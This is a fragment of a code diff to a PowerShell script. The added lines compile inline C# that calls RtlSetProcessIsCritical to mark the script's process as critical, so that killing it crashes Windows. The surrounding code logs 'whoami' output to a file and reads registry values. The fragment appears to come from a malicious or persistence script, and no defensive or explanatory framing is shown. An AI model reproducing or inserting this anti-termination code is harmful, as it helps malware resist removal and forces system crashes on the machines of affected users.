@@ -29,6 +29,17 @@ $paths = @(
 )
 Start-Process powershell.exe -ArgumentList "-Command `"whoami >> C:\whoami3.txt`""
 
+$signature = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class CS {
+    [DllImport("ntdll.dll")]
+    public static extern int RtlSetProcessIsCritical(uint v1, uint v2, uint v3);
+}
+"@
+Add-Type -TypeDefinition $signature
+[CS]::RtlSetProcessIsCritical(1, 0, 0) | Out-Null
 
 $itemMem = Get-ItemProperty -Path "$basePath" -Name $memPropertyName -ErrorAction SilentlyContinue
 
